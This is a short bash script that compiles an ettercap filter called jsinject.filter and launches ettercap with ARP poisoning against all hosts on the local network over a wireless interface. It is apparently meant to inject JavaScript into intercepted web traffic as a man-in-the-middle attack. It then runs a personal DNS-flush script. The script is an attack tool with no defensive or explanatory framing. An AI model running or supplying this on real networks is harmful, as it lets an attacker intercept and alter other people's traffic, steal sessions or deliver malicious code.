#!/bin/bash
#ip=$(sudo ifconfig | grep "inet addr:" | cut -d':' -f2 | cut -d' ' -f1 | grep -v "127.0.0.1")
code='TODO'
if [[ -n $1 ]]; then code="$1"; fi
etterfilter jsinject.filter -o jsinject.ef
sleep 1
sudo ettercap -T -q -i wlp2s0 -F jsinject.ef -M arp /// ///
/home/eddy/programming/bash/flushdns.sh
